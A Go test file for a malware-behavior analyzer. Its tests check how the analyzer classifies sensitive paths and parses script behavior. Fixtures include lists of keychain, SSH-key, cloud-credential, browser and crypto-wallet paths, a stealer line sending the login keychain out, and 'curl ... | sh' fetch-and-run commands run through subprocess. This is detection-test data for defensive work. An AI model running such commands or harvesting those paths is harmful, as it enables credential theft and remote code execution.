package extract

import (
	"fmt"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestNativeFunctionNameObjectiveCMethods(t *testing.T) {
	tests := map[string]string{
		`- (void)requestFinderAccess {`:                            "requestFinderAccess",
		`+ (instancetype)sharedInstance {`:                         "sharedInstance",
		`- (void)promptWithUser:(NSString *)user password:(id)p {`: "promptWithUser:password:",
		`int runHelper(const char *path) {`:                        "runHelper",
	}
	for input, want := range tests {
		if got := nativeFunctionName(input); got != want {
			t.Fatalf("nativeFunctionName(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestSensitiveResourceConcretePrefersEmbeddedPath(t *testing.T) {
	resource, ok := sensitiveResource("By default the keychain will be created in ~/Library/Keychains/.")
	if !ok {
		t.Fatal("expected keychain resource")
	}
	if resource.Kind != behavior.ResourceFile || !resource.HasClassification(behavior.ResourceClassKeychain) || resource.Value != "~/Library/Keychains/" {
		t.Fatalf("unexpected resource: %#v", resource)
	}
}

func TestSensitiveResourceConcreteKeepsNonPathIndicator(t *testing.T) {
	value := "github_token environment variable"
	resource, ok := sensitiveResource(value)
	if !ok {
		t.Fatal("expected developer-token resource")
	}
	if resource.Kind != behavior.ResourceFile || !resource.HasClassification(behavior.ResourceClassDeveloperTokenStore) || resource.Value != value {
		t.Fatalf("unexpected resource: %#v", resource)
	}
}

func TestSensitiveResourceDoesNotTurnWalletReferencesIntoDataResources(t *testing.T) {
	for _, value := range []string{
		"https://metamask.example/update",
		"https://api.electrum.example/v1",
		"/Users/Shared/Dev/src/Crypto-Bot/wallet/Metamask.go",
		"github.com/example/electrum.Client",
		"crypto-bot/wallet.ExtractAddressInfosFromMetamask",
		"MetamaskH",
		"Ledger Live",
	} {
		if resource, ok := sensitiveResource(value); ok {
			t.Fatalf("wallet reference %q became a data resource: %#v", value, resource)
		}
	}

	for _, value := range []string{
		"~/Library/Application Support/Exodus/exodus.wallet/seed.seco",
		"~/Library/Application Support/Electrum/wallets/default_wallet",
		"~/.electrum/wallets/default_wallet",
		"~/Library/Application Support/Ledger Live/wallets",
		"~/Library/Application Support/Atomic/Local Storage/leveldb",
		"~/Library/Application Support/Coinomi/wallets/default",
		"~/Library/Application Support/Guarda/Local Storage/leveldb",
		"~/Library/Application Support/MetaMask/vault",
		"~/Library/Containers/io.metamask.wallet/Data",
		"~/.metamask/vault",
	} {
		resource, ok := sensitiveResource(value)
		if !ok || resource.Kind != behavior.ResourceFile || !resource.HasClassification(behavior.ResourceClassCryptoWalletStore) {
			t.Fatalf("wallet data path %q was not recognized: %#v, ok=%v", value, resource, ok)
		}
	}
}

func TestSensitiveResourceRecognizesCommonApplicationDataDirectories(t *testing.T) {
	for _, test := range []struct {
		path           string
		classification behavior.ResourceClassification
	}{
		{"~/Library/Mail", behavior.ResourceClassMailDataStore},
		{"~/Library/Messages", behavior.ResourceClassMessagingDataStore},
		{"~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", behavior.ResourceClassNotesDataStore},
		{"~/Library/Application Support/Firefox/Profiles/default-release", behavior.ResourceClassBrowserDataStore},
		{"~/Library/Application Support/Vivaldi/Default/Login Data", behavior.ResourceClassBrowserPasswordStore},
		{"~/Library/Application Support/Slack/Local Storage/leveldb", behavior.ResourceClassMessagingDataStore},
		{"~/Library/Group Containers/group.net.whatsapp.WhatsApp.shared/ChatStorage.sqlite", behavior.ResourceClassMessagingDataStore},
		{"~/Library/Application Support/Tunnelblick/Configurations/work.tblk", behavior.ResourceClassVPNProfileStore},
		{"~/.ssh/id_ecdsa", behavior.ResourceClassSSHPrivateKey},
		{"~/.azure/accessTokens.json", behavior.ResourceClassCloudCredentialStore},
		{"~/.kube/config", behavior.ResourceClassCloudCredentialStore},
		{"~/.config/gh/hosts.yml", behavior.ResourceClassDeveloperTokenStore},
		{"~/.cargo/credentials.toml", behavior.ResourceClassDeveloperTokenStore},
	} {
		resource, ok := sensitiveResource(test.path)
		if !ok || !resource.HasClassification(test.classification) {
			t.Fatalf("application data path %q = %#v, ok=%v", test.path, resource, ok)
		}
	}
}

func TestSensitiveResourceRejectsConcatenatedNativeStringRun(t *testing.T) {
	for _, value := range []string{
		"Library/LaunchAgentssw_versLibraryChromeLibrary/Application Support/Google/ChromeBraveLibrary/Application Support/BraveSoftware/Brave-Browserruntime diagnostics",
		"/.electrum//.metamask/Rust",
		"//ftp://$home/.npmrcmacho/-dylib/dtds//legal/\\",
		"/prefix/.aws/credentials/.docker/config.json/runtime",
		"https://example.invalid/.azure/branding",
		"https://github.com/example/.config/gh/hosts.yml/parser",
	} {
		if resource, ok := sensitiveResource(value); ok {
			t.Fatalf("concatenated printable run %q became one concrete resource: %#v", value, resource)
		}
	}
	resource, ok := sensitiveResource("library/application support/google/chrome")
	if !ok || resource.Value != "library/application support/google/chrome" || !resource.HasClassification(behavior.ResourceClassBrowserDataStore) {
		t.Fatalf("standalone relative resource marker was lost: %#v, ok=%v", resource, ok)
	}
}

func TestExtractTextDoesNotDuplicateSensitiveReadOperation(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "reader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "unknown",
		Data:        []byte(`data = open("~/Library/Keychains/login.keychain-db").read()`),
	})

	var reads []behavior.ModeledOperation
	for _, operation := range graph.Operations {
		if operation.Kind == "file.read" {
			reads = append(reads, operation)
		}
	}
	if len(reads) != 1 || !reads[0].RequiredResource().HasClassification(behavior.ResourceClassKeychain) || reads[0].RequiredResource().Value != "~/Library/Keychains/login.keychain-db" {
		t.Fatalf("sensitive read produced duplicate or malformed operations: %#v", graph.Operations)
	}
}

func TestExtractTextDoesNotDuplicateQuotedResourceAsSourceExpression(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "stealer.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data:        []byte(`send_file('keychain', os.path.join(home, 'Library', 'Keychains', 'login.keychain-db'))`),
	})

	var values []string
	for _, feature := range graph.Features {
		if feature.Key == "script.sensitive_resource" && feature.Qualifiers["category"] == "keychain" {
			values = append(values, feature.Value)
		}
	}
	if len(values) != 1 || values[0] != "login.keychain-db" {
		t.Fatalf("quoted keychain resource produced malformed duplicates: %#v", values)
	}
}

func TestPythonStringEscapesPreserveUnknownPathSeparators(t *testing.T) {
	tests := []struct {
		expr string
		want string
	}{
		{expr: `"\Public"`, want: `\Public`},
		{expr: `"\\Public"`, want: `\Public`},
		{expr: `r"\n"`, want: `\n`},
		{expr: `"\n"`, want: "\n"},
	}
	for _, tt := range tests {
		got, ok := quotedExpressionLiteral(tt.expr)
		if !ok || got != tt.want {
			t.Fatalf("quotedExpressionLiteral(%q) = %q, %v, want %q, true", tt.expr, got, ok, tt.want)
		}
	}

	got := resolvePythonPathExpression(`os.path.join(home, "\Public", "dockerd")`, map[string]string{"home": "~"})
	if got != `~/\Public/dockerd` {
		t.Fatalf("Python path with unknown escape = %q, want %q", got, `~/\Public/dockerd`)
	}
}

func TestExtractTextPreservesUnknownPythonEscapeThroughPathVariables(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(`home = os.path.expanduser("~")
folder_path = os.path.join(home, "\Public")
path1 = os.path.join(folder_path, "dockerd")
os.chmod(path1, 0o755)
`),
	})

	for _, operation := range graph.Operations {
		if operation.Kind == "file.make-executable" {
			if operation.RequiredResource().Value != `~/\Public/dockerd` {
				t.Fatalf("Python path changed across variables: %#v", operation)
			}
			return
		}
	}
	t.Fatalf("missing file.make-executable operation: %#v", graph.Operations)
}

func TestJavaScriptRequestAssignmentPartsAcceptDeclarationWhitespace(t *testing.T) {
	name, expr, ok := requestAssignmentParts("javascript", "const\tresponse = await fetch(url)")
	if !ok || name != "response" || expr != "await fetch(url)" {
		t.Fatalf("requestAssignmentParts() = %q, %q, %v", name, expr, ok)
	}
}

func TestJavaScriptResponseBodySuffixRequiresPropertyBoundary(t *testing.T) {
	if !containsJavaScriptResponseBody("Buffer.from(await response.arrayBuffer())", "response") {
		t.Fatal("arrayBuffer response body should be recognized")
	}
	if !containsJavaScriptResponseBody("fs.writeFileSync(target, response.data)", "response") {
		t.Fatal("data response property should be recognized")
	}
	if containsJavaScriptResponseBody("fs.writeFileSync(target, response.database)", "response") {
		t.Fatal("database property should not be treated as response data")
	}
	if containsJavaScriptResponseBody("fs.writeFileSync(target, other.data)", "response") {
		t.Fatal("unrelated variable should not be treated as response data")
	}
}

func TestDirectNativeSourceFunctionCallsObjectiveCMethods(t *testing.T) {
	known := map[string]bool{
		"getMacOSPassword":         true,
		"verifyPassword:password:": true,
		"logMessage":               true,
	}
	tests := map[string][]string{
		`if ([self verifyPassword:username password:password]) {`: {"verifyPassword:password:"},
		`[self getMacOSPassword];`:                                {"getMacOSPassword"},
		`NSLog(@"[self getMacOSPassword]");`:                      nil,
		`- (void)getMacOSPassword {`:                              nil,
	}
	for input, want := range tests {
		got := directNativeSourceFunctionCalls(input, "caller", known)
		if strings.Join(got, ",") != strings.Join(want, ",") {
			t.Fatalf("directNativeSourceFunctionCalls(%q) = %#v, want %#v", input, got, want)
		}
	}
}

func TestNativeSourceCallScannersStayLinearOnDelimiterDenseLine(t *testing.T) {
	if testing.Short() {
		t.Skip("large hostile-input regression")
	}
	started := time.Now()
	if calls := nativeCCalls(strings.Repeat("(", maxTextAnalysisLineBytes)); len(calls) != 0 {
		t.Fatalf("delimiter-only C line produced calls: %#v", calls)
	}
	if calls := objectiveCMessageCalls(strings.Repeat("[", maxTextAnalysisLineBytes)); len(calls) != 0 {
		t.Fatalf("delimiter-only Objective-C line produced calls: %#v", calls)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("native source call scanning took %s for two maximum-size lines", elapsed)
	}
}

func TestExtractTextPythonShellCommandRequiresInlineLiteral(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"import subprocess\n" +
				`cmd = "curl https://py-cmd.example/payload | sh"` + "\n" +
				`subprocess.run(cmd, shell=True)` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("dynamic shell command should retain only a neutral shell attempt: %#v", graph)
	}
	executable, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleExecutable)
	if !ok || executable.Resource.Value != "/bin/sh" || graph.Operations[0].Qualifiers["unresolved_arguments"] == "" {
		t.Fatalf("dynamic shell command was not bounded to Python's POSIX shell identity: %#v", graph.Operations[0])
	}
}

func TestExtractTextPythonShellCommandInlineLiteralFindsPipeline(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import subprocess\n" + `subprocess.run("curl https://py-cmd.example/payload | sh", shell=True)`),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://py-cmd.example/payload")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("inline shell command should produce one pipes-to relation: %#v", graph.Relations)
	}
}

func TestExtractTextDoesNotTreatPythonArgvStringAsShellCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"import subprocess\n" +
				`cmd = "curl https://argv-string.example/payload | sh"` + "\n" +
				`subprocess.run(cmd)` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("subprocess argv string without shell=True should not become shell behavior: network=%#v relations=%#v", graph.Network, graph.Relations)
	}
}

func TestExtractTextDoesNotTreatPythonArgvListPipeAsShell(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import subprocess\n" + `subprocess.run(["curl", "https://argv-list.example/payload", "|", "sh"])`),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://argv-list.example/payload")
	if hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("argv list pipe token should not produce shell pipeline relation: %#v", graph.Relations)
	}
}

func TestExtractTextPythonArgvShellCommandStillFindsPipeline(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "loader.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import subprocess\n" + `subprocess.run(["sh", "-c", "curl https://argv-shell.example/payload | sh"])`),
	}

	ExtractText(&graph, content)

	assertShellCommandNetwork(t, graph, "https://argv-shell.example/payload")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("sh -c argv should produce one shell pipeline relation: %#v", graph.Relations)
	}
}

func TestExtractTextPythonSubprocessArgvFailsClosedOnDynamicPositions(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "archive.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import subprocess\n" + `subprocess.run(["tar", "-czf", archive_path, "-C", source_dir, "payload.enc"])`),
	})

	assertNoOperationKind(t, graph, behavior.OperationArchiveCreate)
	operation, ok := pythonAPIOperation(graph, behavior.OperationProcessExecute, behavior.ResourceRoleExecutable, "tar")
	if !ok || operation.Qualifiers["argument_coverage"] != "executable-only" ||
		operation.Qualifiers["unresolved_arguments"] != "dynamic or unsupported argv" {
		t.Fatalf("dynamic archive argv should retain only the exact executable: operations=%#v coverage=%#v", graph.Operations, graph.Coverage)
	}
}

func TestExtractTextPythonSubprocessLiteralArgvPreservesPositions(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "archive.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("import subprocess\n" + `subprocess.run(["tar", "-czf", "/tmp/output.tgz", "-C", "/tmp/source", "payload.enc"])`),
	})

	assertOperation(t, graph, behavior.OperationArchiveCreate, "archive", "/tmp/output.tgz")
}

func TestExtractTextPythonSubprocessLaunchGrammarFailsClosed(t *testing.T) {
	tests := map[string]string{
		"quoted decoy":          `print('subprocess.run(["curl", "https://quoted.example/"])')`,
		"non-launch helper":     `subprocess.list2cmdline(["curl", "https://helper.example/"])`,
		"malformed call":        `subprocess.run(["curl", "https://malformed.example/"]`,
		"kwargs splat":          `subprocess.run(["curl", "https://kwargs.example/"], **options)`,
		"unknown keyword":       `subprocess.run(["curl", "https://unknown-keyword.example/"], future_option=True)`,
		"Popen run keyword":     `subprocess.Popen(["curl", "https://popen-check.example/"], check=True)`,
		"check call input":      `subprocess.check_call(["curl", "https://check-call-input.example/"], input=b"x")`,
		"input stdin conflict":  `subprocess.run(["curl", "https://input-stdin.example/"], input=b"x", stdin=subprocess.PIPE)`,
		"capture conflict":      `subprocess.run(["curl", "https://capture-conflict.example/"], capture_output=True, stdout=subprocess.PIPE)`,
		"check output stdout":   `subprocess.check_output(["curl", "https://check-output-stdout.example/"], stdout=subprocess.PIPE)`,
		"interior empty argv":   `subprocess.run(["curl", , "https://empty.example/"])`,
		"empty argv list":       `subprocess.run([])`,
		"empty argv tuple":      `subprocess.run(())`,
		"invalid numeric":       `subprocess.run([01, "arg"])`,
		"invalid string prefix": `subprocess.run([bu"tool", "arg"])`,
		"multiple calls":        `subprocess.run(["curl", "https://first.example/"]); subprocess.run(["curl", "https://second.example/"])`,
	}
	for name, source := range tests {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "subprocess.py",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte("import subprocess\n" + source),
			})
			if len(graph.Operations) != 0 || len(graph.Network) != 0 {
				t.Fatalf("unsupported subprocess shape became behavior: operations=%#v network=%#v", graph.Operations, graph.Network)
			}
		})
	}
}

func TestExtractTextPythonSubprocessRetainsUnresolvedAttemptWithoutProjectingIdentifierBindings(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			`import subprocess` + "\n" +
				`tool = "curl"` + "\n" +
				`subprocess.run([tool, "https://exact-binding.example/"], check=True, shell=False)` + "\n",
		),
	})

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute {
		t.Fatalf("stable subprocess call did not retain one neutral attempt: %#v", graph.Operations)
	}
	operation := graph.Operations[0]
	executable, ok := operation.FirstBinding(behavior.ResourceRoleExecutable)
	if !ok || executable.Resource.Value != "" || operation.Qualifiers["unresolved_executable"] == "" {
		t.Fatalf("identifier binding was projected as a concrete executable: %#v", operation)
	}
	if len(graph.Network) != 0 {
		t.Fatalf("unresolved argv URL became network behavior: %#v", graph.Network)
	}
}

func TestExtractTextPythonSubprocessDynamicFormsRemainNeutral(t *testing.T) {
	for name, test := range map[string]struct {
		source     string
		executable string
	}{
		"conditional binding": {
			source: "tool = \"curl\" if False else \"echo\"\n" + `subprocess.run([tool, "https://conditional.example/"])`,
		},
		"truthy non-bool shell value": {
			source: `subprocess.run(["curl", "https://shell-string.example/"], shell="false")`,
		},
		"dynamic shell value": {
			source: `subprocess.run(["curl", "https://dynamic-shell.example/"], shell=use_shell)`,
		},
		"exact executable override": {
			source: `subprocess.run(["curl", "https://override.example/"], executable="/bin/echo")`, executable: "/bin/echo",
		},
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID: "node-0001", LogicalPath: "subprocess.py", Kind: "script", MediaType: "text/plain",
				Data: []byte("import subprocess\n" + test.source + "\n"),
			})
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute {
				t.Fatalf("valid stable subprocess form was not retained once: %#v", graph.Operations)
			}
			resource, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleExecutable)
			if !ok || resource.Resource.Value != test.executable {
				t.Fatalf("executable = %#v, want %q", resource, test.executable)
			}
			if len(graph.Network) != 0 {
				t.Fatalf("unresolved subprocess content became network behavior: %#v", graph.Network)
			}
		})
	}
}

func TestExtractTextPythonSubprocessRequiresStableSameScopeImport(t *testing.T) {
	for name, source := range map[string]string{
		"missing import": `subprocess.run(["/usr/bin/id"])`,
		"aliased import": "import fake as subprocess\n" +
			`subprocess.run(["/usr/bin/id"])`,
		"rebound import": "import subprocess\nsubprocess = Fake()\n" +
			`subprocess.run(["/usr/bin/id"])`,
		"malformed keyword value": "import subprocess\n" +
			`subprocess.run(["/usr/bin/id"], check=???)`,
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "subprocess.py",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(source),
			})
			if len(graph.Operations) != 0 {
				t.Fatalf("unproved or malformed subprocess binding became behavior: %#v", graph.Operations)
			}
			if !hasPartialCoverageScope(graph.Coverage, "python-subprocess-analysis") {
				t.Fatalf("unproved subprocess omission lacks partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextPythonSubprocessAcceptsStableModuleImportInFunction(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte("import subprocess\ndef launch():\n" +
			`    subprocess.run(["/usr/bin/id"])` + "\n"),
	})

	assertOperation(t, graph, behavior.OperationProcessExecute, "file", "/usr/bin/id")
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationProcessExecute && len(operation.EvidenceIDs) != 2 {
			t.Fatalf("module import lineage missing from operation: %#v", operation)
		}
	}
}

func TestExtractTextPythonSubprocessAcceptsStableAliasedModuleImport(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte("import subprocess as process_runner\ndef launch():\n" +
			`    process_runner.run(["/usr/bin/id", "-u"])` + "\n"),
	})

	assertOperation(t, graph, behavior.OperationProcessExecute, "file", "/usr/bin/id")
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationProcessExecute && len(operation.EvidenceIDs) != 2 {
			t.Fatalf("aliased import lineage missing from operation: %#v", operation)
		}
	}
}

func TestExtractTextPythonSubprocessRetainsExactExecutableWithDynamicArgv(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte("import subprocess as process_runner\n" +
			`process_runner.run(["unzip", "-d", destination(), archive_path], check=False)` + "\n"),
	})

	operation, ok := pythonAPIOperation(graph, behavior.OperationProcessExecute, behavior.ResourceRoleExecutable, "unzip")
	if !ok || operation.Support != behavior.SupportCorroborated ||
		operation.Qualifiers["argument_coverage"] != "executable-only" ||
		operation.Qualifiers["unresolved_arguments"] != "dynamic or unsupported argv" ||
		operation.Qualifiers["api"] != "subprocess.run" {
		t.Fatalf("exact executable with dynamic argv was not retained honestly: %#v", operation)
	}
	if _, ok := operation.FirstBinding(behavior.ResourceRoleArguments); ok {
		t.Fatalf("dynamic argv gained a concrete arguments binding: %#v", operation.ResourceBindings)
	}
	if len(operation.EvidenceIDs) != 2 {
		t.Fatalf("executable-only operation lost call/import lineage: %#v", operation.EvidenceIDs)
	}
}

func TestExtractTextPythonSubprocessRetainsHonestExecutableLowerBound(t *testing.T) {
	for name, test := range map[string]struct {
		call       string
		executable string
		wantOp     bool
	}{
		"dynamic executable":     {call: `subprocess.run([resolve_tool(), "-d", target])`, wantOp: true},
		"shell changes identity": {call: `subprocess.run(["unzip", dynamic], shell=True)`, executable: "/bin/sh", wantOp: true},
		"executable override":    {call: `subprocess.run(["unzip", dynamic], executable="/bin/sh")`, executable: "/bin/sh", wantOp: true},
		"environment override":   {call: `subprocess.run(["unzip", dynamic], env=runtime_env)`, executable: "unzip", wantOp: true},
		"malformed argv":         {call: `subprocess.run(["unzip", dynamic)`},
	} {
		t.Run(name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID: "node-0001", LogicalPath: "subprocess.py", Kind: "script", MediaType: "text/plain",
				Data: []byte("import subprocess\n" + test.call + "\n"),
			})
			if !test.wantOp {
				if len(graph.Operations) != 0 {
					t.Fatalf("malformed argv became behavior: %#v", graph.Operations)
				}
				return
			}
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute {
				t.Fatalf("valid subprocess attempt was not retained once: %#v", graph.Operations)
			}
			resource, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleExecutable)
			if !ok || resource.Resource.Value != test.executable {
				t.Fatalf("executable lower bound = %#v, want %q", resource, test.executable)
			}
			if graph.Operations[0].Qualifiers["argument_coverage"] == "" {
				t.Fatalf("unresolved process attempt lacks coverage qualifier: %#v", graph.Operations[0])
			}
		})
	}
}

func TestExtractTextPythonSubprocessRejectsUnboundAlias(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte("process_runner.run([\"/usr/bin/id\"])\n"),
	})
	if len(graph.Operations) != 0 {
		t.Fatalf("unbound subprocess-like alias became behavior: %#v", graph.Operations)
	}
}

func TestExtractTextPythonSubprocessAcceptsLocalExactImport(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "subprocess.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte("def launch():\n" +
			"    import subprocess\n" +
			`    subprocess.run(["/usr/bin/id"])` + "\n"),
	})

	assertOperation(t, graph, behavior.OperationProcessExecute, "file", "/usr/bin/id")
}

func TestExtractTextPythonAsyncFunctionRemainsDormantAndRestoresModuleScope(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:                "node-0001",
		LogicalPath:           "async-scope.py",
		Kind:                  "script",
		MediaType:             "text/plain",
		ExecutionConnectivity: string(behavior.ConnectivityConnected),
		ExecutionRootIDs:      []string{"root-0001"},
		Data: []byte(
			"async def dormant():\n" +
				"    import subprocess\n" +
				`    subprocess.run(["/usr/bin/dormant"])` + "\n" +
				"dormant()\n" +
				"import subprocess\n" +
				`subprocess.run(["/usr/bin/live"])` + "\n",
		),
	})

	var dormant, live *behavior.ModeledOperation
	for index := range graph.Operations {
		operation := &graph.Operations[index]
		switch {
		case testOperationHasResource(*operation, "file", "/usr/bin/dormant"):
			dormant = operation
		case testOperationHasResource(*operation, "file", "/usr/bin/live"):
			live = operation
		}
	}
	if dormant == nil || dormant.SourceFunction != "dormant" ||
		dormant.Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("async function body was not retained as dormant function-scoped behavior: %#v", graph.Operations)
	}
	if live == nil || live.SourceFunction != "" ||
		live.Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("module scope was not restored after async function exit: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "script.function_call" && feature.Value == "dormant" {
			t.Fatalf("calling an async function was treated as direct body execution: %#v", feature)
		}
	}
}

func TestExtractTextPythonClassBodyIsSuppressedAndImportDoesNotLeak(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "class-scope.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"class Loader[T]:\n" +
				"    import subprocess\n" +
				`    subprocess.run(["/usr/bin/class-body"])` + "\n" +
				`subprocess.run(["/usr/bin/leaked"])` + "\n" +
				"import subprocess\n" +
				`subprocess.run(["/usr/bin/module"])` + "\n",
		),
	})

	if len(graph.Operations) != 1 ||
		!testOperationHasResource(graph.Operations[0], "file", "/usr/bin/module") {
		t.Fatalf("class-body behavior or binding escaped its namespace: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-lexical-scope-analysis") {
		t.Fatalf("suppressed class-body semantics lack explicit partial coverage: %#v", graph.Coverage)
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-subprocess-analysis") {
		t.Fatalf("unproved module subprocess binding lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonNestedFunctionExitRestoresOuterScope(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "nested-scope.py",
		Kind:        "script",
		MediaType:   "text/plain",
		Data: []byte(
			"def outer():\n" +
				"    import subprocess\n" +
				"    def inner():\n" +
				`        subprocess.run(["/usr/bin/unproved-inner"])` + "\n" +
				`    subprocess.run(["/usr/bin/restored-outer"])` + "\n" +
				"    def exact_inner():\n" +
				"        import subprocess\n" +
				`        subprocess.run(["/usr/bin/exact-inner"])` + "\n",
		),
	})

	if len(graph.Operations) != 2 {
		t.Fatalf("nested scopes produced unexpected operations: %#v", graph.Operations)
	}
	for _, operation := range graph.Operations {
		if testOperationHasResource(operation, "file", "/usr/bin/unproved-inner") {
			t.Fatalf("nested function inherited an outer subprocess binding: %#v", operation)
		}
		switch {
		case testOperationHasResource(operation, "file", "/usr/bin/restored-outer"):
			if operation.SourceFunction != "outer" {
				t.Fatalf("outer scope was not restored after nested-function exit: %#v", operation)
			}
		case testOperationHasResource(operation, "file", "/usr/bin/exact-inner"):
			if operation.SourceFunction != "exact_inner" {
				t.Fatalf("exact nested-function import lost its lexical scope: %#v", operation)
			}
		default:
			t.Fatalf("unexpected nested-scope operation: %#v", operation)
		}
	}
	if !hasPartialCoverageScope(graph.Coverage, "python-subprocess-analysis") {
		t.Fatalf("rejected inherited nested binding lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextPythonMultilineFunctionHeaderKeepsBodyDormant(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:                "node-0001",
		LogicalPath:           "multiline-function.py",
		Kind:                  "script",
		MediaType:             "text/plain",
		ExecutionConnectivity: string(behavior.ConnectivityConnected),
		ExecutionRootIDs:      []string{"root-0001"},
		Data: []byte(
			"def dormant(\n" +
				"    value=None,\n" +
				"):\n" +
				"    import subprocess\n" +
				`    subprocess.run(["python", "/tmp/must-stay-dormant.py"])` + "\n",
		),
	})

	if len(graph.Operations) != 1 {
		t.Fatalf("multiline function body produced unexpected operations: %#v", graph.Operations)
	}
	operation := graph.Operations[0]
	if operation.SourceFunction != "dormant" ||
		operation.Execution.Connectivity != behavior.ConnectivityUnknown ||
		!testOperationHasResource(operation, string(behavior.ResourceFile), "/tmp/must-stay-dormant.py") {
		t.Fatalf("multiline function body escaped its dormant scope: %#v", operation)
	}
}

